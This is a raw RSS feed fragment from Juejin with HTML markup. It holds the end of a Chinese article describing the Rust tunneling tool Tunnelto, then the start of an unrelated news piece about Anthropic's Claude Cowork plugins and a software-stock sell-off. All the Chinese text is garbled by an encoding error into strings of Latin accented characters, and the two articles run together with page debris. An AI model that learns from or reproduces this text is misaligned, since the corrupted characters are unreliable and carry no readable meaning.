<li><strong>é«˜å¹¶å‘</strong>ï¼šå•çº¿ç¨‹å¯å¤„ç†å¤§é‡å¹¶å‘è¿æ¥</li>
<li><strong>ä½å»¶è¿Ÿ</strong>ï¼šå¼‚æ­¥IOé¿å…çº¿ç¨‹åˆ‡æ¢å¼€é”€</li>
<li><strong>èµ„æºé«˜æ•ˆ</strong>ï¼šç›¸æ¯”ä¼ ç»Ÿå¤šçº¿ç¨‹æ¨¡å‹ï¼Œèµ„æºå ç”¨æ›´ä½</li>
</ul>
<h4 data-id="heading-22">éš§é“ç®¡ç†</h4>
<p>Tunneltoä½¿ç”¨<strong>å­åŸŸåè·¯ç”±</strong>æ¥ç®¡ç†å¤šä¸ªéš§é“ï¼š</p>
<ul>
<li>æ¯ä¸ªéš§é“åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„å­åŸŸå</li>
<li>æœåŠ¡å™¨æ ¹æ®Hostå¤´è·¯ç”±åˆ°å¯¹åº”çš„éš§é“</li>
<li>æ”¯æŒè‡ªå®šä¹‰å­åŸŸåï¼Œæ–¹ä¾¿è®°å¿†å’Œä½¿ç”¨</li>
</ul>
<h4 data-id="heading-23">è‡ªæ‰˜ç®¡å®ç°</h4>
<p>Tunneltoæä¾›äº†å®Œæ•´çš„è‡ªæ‰˜ç®¡æ–¹æ¡ˆï¼š</p>
<p><strong>å•å®ä¾‹éƒ¨ç½²</strong>ï¼š</p>
<ul>
<li>ç¼–è¯‘muslç›®æ ‡ï¼ˆé™æ€é“¾æ¥ï¼‰</li>
<li>ä½¿ç”¨Dockeréƒ¨ç½²</li>
<li>é…ç½®ç¯å¢ƒå˜é‡</li>
</ul>
<p><strong>åˆ†å¸ƒå¼éƒ¨ç½²</strong>ï¼ˆå®˜æ–¹æ–¹æ¡ˆï¼‰ï¼š</p>
<ul>
<li>ä½¿ç”¨Fly.ioçš„Private Networking</li>
<li>å®ç°Gossipåè®®è¿›è¡ŒæœåŠ¡å‘ç°</li>
<li>æ”¯æŒå¤šå®ä¾‹è´Ÿè½½å‡è¡¡</li>
</ul>
<p><strong>å…³é”®é…ç½®</strong>ï¼ˆ<code>tunnelto_server/src/config.rs</code>ï¼‰ï¼š</p>
<ul>
<li><code>ALLOWED_HOSTS</code>ï¼šå…è®¸çš„ä¸»æœºå</li>
<li><code>CTRL_HOST</code>ï¼šæ§åˆ¶æœåŠ¡å™¨åœ°å€</li>
<li><code>CTRL_PORT</code>ï¼šæ§åˆ¶æœåŠ¡å™¨ç«¯å£</li>
<li><code>CTRL_TLS_OFF</code>ï¼šæ˜¯å¦ç¦ç”¨TLSï¼ˆç”¨äºæœ¬åœ°æµ‹è¯•ï¼‰</li>
</ul>
<h3 data-id="heading-24">å®‰å…¨æœºåˆ¶</h3>
<ol>
<li>
<p><strong>APIå¯†é’¥è®¤è¯</strong></p>
<ul>
<li>æ”¯æŒè®¾ç½®APIå¯†é’¥</li>
<li>é˜²æ­¢æœªæˆæƒè®¿é—®</li>
<li>ä¿æŠ¤éš§é“å®‰å…¨</li>
</ul>
</li>
<li>
<p><strong>TLSåŠ å¯†</strong></p>
<ul>
<li>é»˜è®¤ä½¿ç”¨HTTPS</li>
<li>ç«¯åˆ°ç«¯åŠ å¯†</li>
<li>ä¿æŠ¤æ•°æ®ä¼ è¾“å®‰å…¨</li>
</ul>
</li>
<li>
<p><strong>è®¿é—®æ§åˆ¶</strong></p>
<ul>
<li>æ”¯æŒé…ç½®å…è®¸çš„ä¸»æœºå</li>
<li>é˜²æ­¢åŸŸååŠ«æŒ</li>
<li>å¢å¼ºå®‰å…¨æ€§</li>
</ul>
</li>
</ol>
<h3 data-id="heading-25">æ€§èƒ½ä¼˜åŒ–</h3>
<ol>
<li>
<p><strong>é›¶æ‹·è´æŠ€æœ¯</strong></p>
<ul>
<li>Rustçš„æ‰€æœ‰æƒç³»ç»Ÿé¿å…ä¸å¿…è¦çš„å†…å­˜æ‹·è´</li>
<li>æé«˜æ•°æ®ä¼ è¾“æ•ˆç‡</li>
</ul>
</li>
<li>
<p><strong>è¿æ¥æ± ç®¡ç†</strong></p>
<ul>
<li>å¤ç”¨TCPè¿æ¥</li>
<li>å‡å°‘è¿æ¥å»ºç«‹å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>å¼‚æ­¥æ‰¹å¤„ç†</strong></p>
<ul>
<li>æ‰¹é‡å¤„ç†è¯·æ±‚</li>
<li>æé«˜ååé‡</li>
</ul>
</li>
</ol>
<h3 data-id="heading-26">æ‰©å±•æœºåˆ¶</h3>
<p>è™½ç„¶Tunneltoæœ¬èº«åŠŸèƒ½ç›¸å¯¹ç®€å•ï¼Œä½†æä¾›äº†è‰¯å¥½çš„æ‰©å±•æ€§ï¼š</p>
<ol>
<li>
<p><strong>è‡ªå®šä¹‰æœåŠ¡å™¨</strong></p>
<ul>
<li>å¯ä»¥ä¿®æ”¹æœåŠ¡å™¨ä»£ç </li>
<li>æ·»åŠ è‡ªå®šä¹‰åŠŸèƒ½</li>
<li>é›†æˆåˆ°ç°æœ‰ç³»ç»Ÿ</li>
</ul>
</li>
<li>
<p><strong>ç¯å¢ƒå˜é‡é…ç½®</strong></p>
<ul>
<li>é€šè¿‡ç¯å¢ƒå˜é‡çµæ´»é…ç½®</li>
<li>æ”¯æŒä¸åŒéƒ¨ç½²åœºæ™¯</li>
<li>æ˜“äºé›†æˆåˆ°CI/CD</li>
</ul>
</li>
<li>
<p><strong>APIæ¥å£</strong></p>
<ul>
<li>æ§åˆ¶WebSocketåè®®å¼€æ”¾</li>
<li>å¯ä»¥å¼€å‘è‡ªå®šä¹‰å®¢æˆ·ç«¯</li>
<li>é›†æˆåˆ°å…¶ä»–å·¥å…·</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-27">é¡¹ç›®åœ°å€ä¸èµ„æº</h2>
<h3 data-id="heading-28">å®˜æ–¹èµ„æº</h3>
<ul>
<li>ğŸŒŸ <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagrinman%2Ftunnelto" target="_blank" title="https://github.com/agrinman/tunnelto" ref="nofollow noopener noreferrer">github.com/agrinman/tuâ€¦</a></li>
<li>ğŸ“š <strong>æ–‡æ¡£</strong>: GitHub READMEåŒ…å«å®Œæ•´ä½¿ç”¨æŒ‡å—</li>
<li>ğŸŒ <strong>å®˜ç½‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftunnelto.dev" target="_blank" title="https://tunnelto.dev" ref="nofollow noopener noreferrer">tunnelto.dev</a></li>
</ul>
<h3 data-id="heading-29">é€‚ç”¨äººç¾¤</h3>
<p><strong>Tunneltoç‰¹åˆ«é€‚åˆä»¥ä¸‹å¼€å‘è€…</strong>ï¼š</p>
<ol>
<li>
<p><strong>Webå¼€å‘è€…</strong></p>
<ul>
<li>éœ€è¦å¿«é€Ÿæš´éœ²æœ¬åœ°æœåŠ¡è¿›è¡Œæµ‹è¯•</li>
<li>éœ€è¦é›†æˆç¬¬ä¸‰æ–¹æœåŠ¡ï¼ˆOAuthã€Webhookï¼‰</li>
<li>éœ€è¦æ¼”ç¤ºå’Œåˆ†äº«æœ¬åœ°é¡¹ç›®</li>
</ul>
</li>
<li>
<p><strong>å…¨æ ˆå·¥ç¨‹å¸ˆ</strong></p>
<ul>
<li>éœ€è¦è®©å‰ç«¯è®¿é—®æœ¬åœ°API</li>
<li>éœ€è¦æµ‹è¯•ç§»åŠ¨åº”ç”¨ä¸åç«¯é›†æˆ</li>
<li>éœ€è¦è°ƒè¯•è·¨åŸŸé—®é¢˜</li>
</ul>
</li>
<li>
<p><strong>DevOpså·¥ç¨‹å¸ˆ</strong></p>
<ul>
<li>éœ€è¦è‡ªæ‰˜ç®¡å†…ç½‘ç©¿é€æœåŠ¡</li>
<li>éœ€è¦é›†æˆåˆ°CI/CDæµç¨‹</li>
<li>å¯¹æ€§èƒ½å’Œå®‰å…¨æ€§æœ‰è¦æ±‚</li>
</ul>
</li>
<li>
<p><strong>Rustå¼€å‘è€…</strong></p>
<ul>
<li>æƒ³å­¦ä¹ Rustå¼‚æ­¥IOå®è·µ</li>
<li>æƒ³äº†è§£ç½‘ç»œç¼–ç¨‹æœ€ä½³å®è·µ</li>
<li>æƒ³è´¡çŒ®å¼€æºé¡¹ç›®</li>
</ul>
</li>
<li>
<p><strong>å¯¹éšç§æœ‰è¦æ±‚çš„å¼€å‘è€…</strong></p>
<ul>
<li>ä¸æƒ³ä½¿ç”¨ç¬¬ä¸‰æ–¹å•†ä¸šæœåŠ¡</li>
<li>éœ€è¦å®Œå…¨æ§åˆ¶æ•°æ®</li>
<li>éœ€è¦è‡ªæ‰˜ç®¡è§£å†³æ–¹æ¡ˆ</li>
</ul>
</li>
</ol>
<hr/>
<p><em>æ¬¢è¿æ¥æˆ‘ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>æ‰¾åˆ°æ›´å¤šæœ‰ç”¨çš„çŸ¥è¯†å’Œæœ‰è¶£çš„äº§å“</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ˜¨å¤œï¼ŒClaudeæ™ºèƒ½ä½“å‹å®åå°”è¡—ï¼Œè¿‘ä¸‡äº¿åˆ€å¸‚å€¼è’¸å‘]]></title>    <link>https://juejin.cn/post/7602931486598414371</link>    <guid>https://juejin.cn/post/7602931486598414371</guid>    <pubDate>2026-02-05T10:03:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602931486598414371" data-draft-id="7603043152672653327" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ˜¨å¤œï¼ŒClaudeæ™ºèƒ½ä½“å‹å®åå°”è¡—ï¼Œè¿‘ä¸‡äº¿åˆ€å¸‚å€¼è’¸å‘"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T10:03:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœºå™¨ä¹‹å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ˜¨å¤œï¼ŒClaudeæ™ºèƒ½ä½“å‹å®åå°”è¡—ï¼Œè¿‘ä¸‡äº¿åˆ€å¸‚å€¼è’¸å‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœºå™¨ä¹‹å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:03:53.000Z" title="Thu Feb 05 2026 10:03:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>AI åœ¨ä»£æ›¿äººç±»ä¹‹å‰ï¼Œå…ˆè¦æ›¿ä»£ä¸€å¤§æ³¢è½¯ä»¶ï¼Ÿ</p>
<p>æ˜¨å¤œï¼Œæ•´ä¸ªåå°”è¡—é™·å…¥äº†ææ…Œï¼ŒAnthropic å‘å¸ƒçš„æ–°ä¸€ä»£äººå·¥æ™ºèƒ½å·¥å…·ã€ŒClaude Coworkã€åŠå…¶é…å¥—çš„ 11 æ¬¾èŒèƒ½æ’ä»¶æ­£å¼ä¸Šçº¿ï¼Œè¢«å¸‚åœºè§†ä¸º AI ä»ã€Œè¾…åŠ©å·¥å…·ï¼ˆCopilotï¼‰ã€å‘ã€Œç‹¬ç«‹å‘˜å·¥ï¼ˆAgentï¼‰ã€è·¨è¶Šçš„åˆ†æ°´å²­ï¼Œç›´æ¥åŠ¨æ‘‡äº† SaaS è½¯ä»¶çš„å•†ä¸šæ ¹åŸºã€‚</p>
<p>ä»ç”²éª¨æ–‡ã€Adobeã€Salesforce åˆ°æ±¤æ£®è·¯é€ã€NECï¼Œä¸€ç³»åˆ—äººä»¬è€³ç†Ÿèƒ½è¯¦çš„çŸ¥åå…¬å¸è‚¡ç¥¨é­åˆ°æŠ›å”®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecdad619ac3d45e48bc33e8b245fb4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=04tAaZ%2B3m%2FFQFHLdbKicGnWvrfI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½œä¸ºæ™ºèƒ½ä½“æ—¶ä»£çš„ AI å·¥å…·ï¼ŒClaude Cowork è¿œè¿œè¶…è¶Šäº†å¤§æ¨¡å‹èŠå¤©æœºå™¨äººçš„èŒƒç•´ã€‚Cowork å¯ä»¥ç›´æ¥åœ¨ä½ çš„ç”µè„‘ä¸Šå¸®ä½ å¹²æ´»ï¼Œå®ƒæ‹¥æœ‰è¶³å¤Ÿé«˜çš„æƒé™ï¼Œå¯ä»¥æ¥ç®¡ä½ çš„é¼ æ ‡ã€é”®ç›˜å’Œæ–‡ä»¶ç³»ç»Ÿï¼ŒæŒ‰ç…§ä½ çš„æ¨¡ç³ŠæŒ‡ä»¤ï¼Œè‡ªä¸»è§„åˆ’å¹¶å®Œæˆä¸€è¿ä¸²å¤æ‚çš„å·¥ä½œã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œä¸æœ€è¿‘å¾ˆç«çš„å¼€æºé¡¹ç›® ClawdBot ä¸åŒåœ¨äºï¼Œä¸ºäº†é˜²æ­¢ AI è¯¯åˆ æ–‡ä»¶æˆ–é€šè¿‡è”ç½‘å®Œæˆäººä»¬é¢„æ–™ä¹‹å¤–çš„æ“ä½œï¼ŒClaude Cowork è¿è¡Œåœ¨éš”ç¦»çš„è™šæ‹Ÿæœºï¼ˆVMï¼‰ç¯å¢ƒä¸­ã€‚</p>
<p>è¿™æ˜¯ä¸€ä¸ªæ›´åŠ ä¸¥è‚ƒï¼Œä¸€ä¸Šæ¥å°±è¢«è®¾è®¡ä¸ºç”¨æ¥å¹²æ´»çš„æ™ºèƒ½ä½“ã€‚Anthropic ä¸º Claude Cowork å‡†å¤‡äº†ä¸€ç³»åˆ—ã€ŒèŒä¸šæŠ€èƒ½åŒ…ã€ï¼Œå…¶è¡¨ç¤ºï¼Œè¿™äº›å·¥å…·å¯ä»¥ç”Ÿæˆè´¢åŠ¡æŠ¥è¡¨ã€ç ”ç©¶é”€å”®çº¿ç´¢ã€å‡†å¤‡é”€å”®ç”µè¯ã€èµ·è‰å®¢æˆ·æ”¯æŒå›å¤ã€è¯„ä¼°ä¿å¯†åè®®ï¼Œä»¥åŠå®¡æŸ¥åˆåŒã€æ³•å¾‹ç®€æŠ¥å’Œæ„å»ºè´¢åŠ¡æ¨¡å‹ã€‚</p>
<p>åˆçœ‹èµ·æ¥ï¼Œè¿™äº›è¯´æ³•å’Œè¿‡å»å¾ˆå¤šå¤§æ¨¡å‹ã€æ™ºèƒ½ä½“å‘å¸ƒæ—¶ AI å…¬å¸å®£ä¼ çš„æƒ…å†µç±»ä¼¼ã€‚åœ¨ 1 æœˆ 12 æ—¥ Claude Cowork çš„ã€Œç ”ç©¶é¢„è§ˆç‰ˆã€é¦–æ¬¡äº®ç›¸æ—¶ï¼Œå¤§å®¶åªè§‰å¾—è¿™æ˜¯ä¸€ä¸ªæ€§èƒ½æ›´å¼ºçš„è‡ªåŠ¨åŒ–å·¥å…·ã€‚</p>
<p>ç„¶è€Œåˆ°äº† 1 æœˆ 31 å·ï¼ŒAnthropic å‘å¸ƒ 11 æ¬¾å®˜æ–¹å¼€æºæ’ä»¶æ—¶ï¼Œæœ‰äººå‘ç°äº‹æƒ…å¹¶æ²¡æœ‰è¿™ä¹ˆç®€å•ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d3e79f839c043b787a4062a43fdceec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=Fn7ip4IK4Y1oznUt10X6J2MydxA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Anthropic ä¸ºå…¶ã€Œæ¡Œé¢çº§å…¨èƒ½æ•°å­—å‘˜å·¥ã€Claude Cowork æ™ºèƒ½ä½“å¹³å°å‘å¸ƒäº†ä¸€ç³»åˆ—æ’ä»¶ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fknowledge-work-plugins%25EF%25BC%2589%25EF%25BC%258C%25E8%25AF%25A5%25E5%2585%25AC%25E5%258F%25B8%25E5%25A3%25B0%25E7%25A7%25B0%25E8%25BF%2599%25E4%25BA%259B%25E6%258F%2592%25E4%25BB%25B6%25E5%258F%25AF%25E4%25BB%25A5%25E8%2587%25AA%25E5%258A%25A8%25E6%2589%25A7%25E8%25A1%258C%25E6%2595%25B0%25E5%258D%2581%25E9%25A1%25B9%25E4%25BB%25BB%25E5%258A%25A1%25EF%25BC%258C%25E5%258C%2585%25E6%258B%25AC%25E5%25AE%25A2%25E6%2588%25B7%25E6%259C%258D%25E5%258A%25A1%25E3%2580%2581%25E4%25BA%25A7%25E5%2593%2581%25E7%25AE%25A1%25E7%2590%2586%25E3%2580%2581%25E5%25B8%2582%25E5%259C%25BA%25E8%2590%25A5%25E9%2594%2580%25E3%2580%2581%25E6%25B3%2595%25E5%25BE%258B%25E5%2592%258C%25E6%2595%25B0%25E6%258D%25AE%25E5%2588%2586%25E6%259E%2590%25E7%25AD%2589%25E5%25B7%25A5%25E4%25BD%259C%25E3%2580%2582" target="_blank" title="https://github.com/anthropics/knowledge-work-plugins%EF%BC%89%EF%BC%8C%E8%AF%A5%E5%85%AC%E5%8F%B8%E5%A3%B0%E7%A7%B0%E8%BF%99%E4%BA%9B%E6%8F%92%E4%BB%B6%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E6%89%A7%E8%A1%8C%E6%95%B0%E5%8D%81%E9%A1%B9%E4%BB%BB%E5%8A%A1%EF%BC%8C%E5%8C%85%E6%8B%AC%E5%AE%A2%E6%88%B7%E6%9C%8D%E5%8A%A1%E3%80%81%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E3%80%81%E5%B8%82%E5%9C%BA%E8%90%A5%E9%94%80%E3%80%81%E6%B3%95%E5%BE%8B%E5%92%8C%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%AD%89%E5%B7%A5%E4%BD%9C%E3%80%82" ref="nofollow noopener noreferrer">github.com/anthropics/â€¦</a></p>
<p>å’Œä¹‹å‰å®£ä¼ è¯´çš„å·®ä¸å¤šï¼Ÿç„¶è€Œè¿™æ¬¡äººä»¬å¼€å§‹æ‹…å¿ƒï¼Œæ”¯æ’‘ç§‘æŠ€å’Œæ•°å­—æœåŠ¡è¡Œä¸šå‘å±•çš„è½¯ä»¶æœåŠ¡ï¼ˆSaaSï¼‰å•†ä¸šæ¨¡å¼å³å°†é¢ä¸´é¢ è¦†æ€§é£é™©ã€‚</p>
<p>åå°”è¡—æ‹…å¿ƒï¼Œåƒ Claude æ’ä»¶è¿™æ ·çš„ AI å·¥å…·ä¼šæŒ‘æˆ˜ç°æœ‰è½¯ä»¶å…¬å¸çš„æ•°æ®åˆ†æå’Œç ”ç©¶äº§å“ â€”â€” åˆ©ç”¨ AI å®ç°è‡ªåŠ¨åŒ–å¹¶æ„å»ºè‡ªæœ‰å·¥å…·çš„å…¬å¸å¯èƒ½ä¼šå‡å°‘å¯¹å¤–éƒ¨ç ”ç©¶å’Œæ•°æ®æœåŠ¡çš„è®¢é˜…ï¼Œè¿™å°†ç›´æ¥æŸå®³è½¯ä»¶å…¬å¸çš„åˆ©æ¶¦ã€‚</p>
<p>å‘¨äºŒé­é‡å…¨é¢æŠ›å”®åï¼Œæ ‡æ™® 500 è½¯ä»¶å’ŒæœåŠ¡æŒ‡æ•°æ¿å—ä¸‹è·Œè¿‘ 4%ï¼Œè¿ç»­ç¬¬å…­ä¸ªäº¤æ˜“æ—¥ä¸‹è·Œï¼Œè‡ª 1 æœˆ 28 æ—¥ä»¥æ¥å¸‚å€¼è’¸å‘çº¦ 8300 äº¿ç¾å…ƒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/faa381774ab8447890b8c639e2f09b9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=cDY5QlRxPyw50fDiqIXFjWXduEw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AI å·¥å…·æœ€ç»ˆæ˜¯å¦ä¼šæ‘§æ¯è½¯ä»¶è¡Œä¸šï¼Œç›®å‰å°šæ— å®šè®ºã€‚ä½†æœ¬å‘¨äºŒï¼ŒæŠ•èµ„è€…ä»¬çš„ææ…Œæ˜¯å®å®åœ¨åœ¨çš„ï¼Œäººä»¬çº·çº·æŠ›å”®æ³•å¾‹å’Œé‡‘èè½¯ä»¶åŠæœåŠ¡å…¬å¸çš„è‚¡ç¥¨ã€‚æ¯•ç«Ÿï¼Œæ—¢ç„¶ AI èƒ½å‡å°‘å†…éƒ¨å¼€å‘æ‰€éœ€çš„æ—¶é—´ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜è¦ä¸ºè½¯ä»¶ä»˜è´¹å‘¢ï¼Ÿ</p>
<p>çœ‹èµ·æ¥ï¼ŒAI å¯¹ä¼—å¤šäº§ä¸šçš„é©å‘½æ­£åœ¨å…·è±¡åŒ–ã€‚ä»Šå¹´ 1 æœˆï¼ŒAnthropic é¦–å¸­æ‰§è¡Œå®˜è¾¾é‡Œå¥¥ãƒ»é˜¿è«è¿ªï¼ˆDario Amodeiï¼‰å°±æ’°æ–‡è®¤ä¸ºã€Œäººå·¥æ™ºèƒ½å¯èƒ½ä¼šåœ¨æœªæ¥ 1-5 å¹´å†…å–ä»£ä¸€åŠçš„å…¥é—¨çº§ç™½é¢†å·¥ä½œã€ã€‚</p>
<p>Anthropic å¯¹æ­¤æœ‰å¤šå¤§çš„ä¿¡å¿ƒå‘¢ï¼Ÿä»–ä»¬æ˜¨å¤©è¿˜å¼ºè°ƒäº†è‡ªå·±ä¸ä¼šåœ¨ AI é‡Œé¢åŠ å¹¿å‘Šï¼Œå®£ä¼ æ‰“åˆ°äº†è¶…çº§ç¢—ï¼Œè¿˜é¡ºå¸¦å˜²è®½äº†ä¸€æ³¢ OpenAIã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a24e50fe364e4f4a970c779903bdfc9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=9QQ9M0dpiQN3caFh7dH1oa7l15k%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>OpenAI åˆ›å§‹äººã€CEO å±±å§†ãƒ»å¥¥ç‰¹æ›¼ä¸å¾—ä¸å‡ºæ¥å›åº”ã€‚</p>
